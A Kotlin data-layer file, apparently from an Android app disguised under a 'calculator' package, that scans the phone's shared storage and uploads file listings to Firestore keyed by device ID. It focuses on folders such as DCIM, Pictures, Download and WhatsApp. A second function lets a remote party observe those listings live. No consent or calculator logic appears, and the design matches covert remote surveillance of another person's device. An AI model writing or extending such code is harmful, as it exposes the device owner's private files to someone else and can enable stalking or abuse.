package com.yosry.dev.calculator.data.file

import com.google.firebase.firestore.FirebaseFirestore
import com.yosry.dev.calculator.domain.file.DeviceFile
import com.yosry.dev.calculator.domain.file.FileRepository
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.tasks.await
import java.io.File

class FileRepositoryImpl(
    private val firestore: FirebaseFirestore
) : FileRepository {

    // Inside FileRepositoryImpl.kt -> syncLocalFolderToFirebase()

    override suspend fun syncLocalFolderToFirebase(deviceId: String, folderPath: String) {
        val directory = File(folderPath)
        if (!directory.exists() || !directory.isDirectory) return

        // 1. Check if we are scanning the very first root screen
        val isRootDirectory = folderPath == "/storage/emulated/0"

        val fileList = directory.listFiles()?.mapNotNull { file ->
            val name = file.name

            // 2. Always ignore hidden files (like .nomedia or .thumbnails)
            if (name.startsWith(".")) {
                return@mapNotNull null
            }

            // 3. INCLUDE FILTER: Only apply this to the root directory
            if (isRootDirectory) {
                // These are the ONLY folders that will show up on the main screen
                val includedFolders = listOf(
                    "DCIM",
                    "Pictures",
                    "Download",
                    "Documents",
                    "Movies",
                    "WhatsApp" // Add any others you want here
                )

                // If the folder name is NOT in our list, skip it
                if (!includedFolders.contains(name)) {
                    return@mapNotNull null
                }
            }

            // 4. Map the valid files to our Data Class
            DeviceFile(
                name = name,
                path = file.absolutePath,
                isDirectory = file.isDirectory,
                sizeBytes = file.length(),
                lastModified = file.lastModified()
            )
        } ?: emptyList()

        val safePathId = folderPath.replace("/", "_")

        firestore.collection("devices")
            .document(deviceId)
            .collection("folders")
            .document(safePathId)
            .set(mapOf("files" to fileList))
            .await()
    }

    override fun observeRemoteFiles(deviceId: String, folderPath: String): Flow<List<DeviceFile>> =
        callbackFlow {
            if (folderPath.isBlank()) {
                trySend(emptyList())
                close()
                return@callbackFlow
            }
            val safePathId = folderPath.replace("/", "_")

            val listener = firestore.collection("devices")
                .document(deviceId)
                .collection("folders")
                .document(safePathId)
                .addSnapshotListener { snapshot, error ->
                    if (error != null) {
                        close(error)
                        return@addSnapshotListener
                    }

                    if (snapshot != null && snapshot.exists()) {
                        val rawList = snapshot.get("files") as? List<Map<String, Any>> ?: emptyList()
                        val files = rawList.map { map ->
                            DeviceFile(
                                name = map["name"] as? String ?: "",
                                path = map["path"] as? String ?: "",
                                // FIX: Check for "directory" (Firebase name) instead of just "isDirectory"
                                isDirectory = map["directory"] as? Boolean ?: map["isDirectory"] as? Boolean ?: false,
                                sizeBytes = (map["sizeBytes"] as? Number)?.toLong() ?: 0L,
                                lastModified = (map["lastModified"] as? Number)?.toLong() ?: 0L
                            )
                        }

                        // Sort so Folders appear at the top, then Files
                        val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
                        trySend(sortedFiles)

                    } else {
                        trySend(emptyList())
                    }
                }

            awaitClose { listener.remove() }
        }
}